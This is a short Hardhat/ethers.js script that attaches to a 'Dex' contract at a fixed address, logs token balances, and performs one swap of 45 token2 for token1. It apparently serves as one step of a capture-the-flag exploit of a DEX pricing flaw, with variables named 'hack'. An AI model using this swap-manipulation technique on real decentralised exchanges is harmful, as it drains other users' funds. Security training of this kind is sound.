const { assert } = require("chai");

async function main() {
    
    const [deployer] = await ethers.getSigners();
    
    console.log("Deploying contracts with the account:", deployer.address);
    console.log("Account balance:", (await deployer.getBalance()).toString());

    dex_address = "0x7231827A0c3fEaFe9C2BC5fc5D3f91932648Ec24";

    // Deploy
    hack_contract = await ethers.getContractFactory("Dex");
    hack = await hack_contract.attach(dex_address);

    token1_address = await hack.token1();
    token2_address = await hack.token2();

    contract_tk1_amount = await hack.balanceOf(token1_address, dex_address);
    contract_tk2_amount = await hack.balanceOf(token2_address, dex_address);

    user_tk1_amount = await hack.balanceOf(token1_address, deployer.address);
    user_tk2_amount = await hack.balanceOf(token2_address, deployer.address);



    // console.log("token1 address: ", token1_address);
    // console.log("token2 address: ", token2_address);

    console.log("Token1 contract amount: ", contract_tk1_amount, "user", user_tk1_amount);
    console.log("Token2 contract amount: ", contract_tk2_amount, "user", user_tk2_amount);

    console.log("----------- Swap ------------");
    // tx = await hack.swap(token1_address, token2_address, user_tk1_amount)
    tx = await hack.swap(token2_address, token1_address, 45);

    receipt = await tx.wait();

    contract_tk1_amount = await hack.balanceOf(token1_address, dex_address);
    contract_tk2_amount = await hack.balanceOf(token2_address, dex_address);

    user_tk1_amount = await hack.balanceOf(token1_address, deployer.address);
    user_tk2_amount = await hack.balanceOf(token2_address, deployer.address);

    console.log("Token1 contract amount: ", contract_tk1_amount, "user", user_tk1_amount);
    console.log("Token2 contract amount: ", contract_tk2_amount, "user", user_tk2_amount);
}


main()
    .then(() => process.exit(0))
    .catch((error) => {
      console.error(error);
      process.exit(1);
});
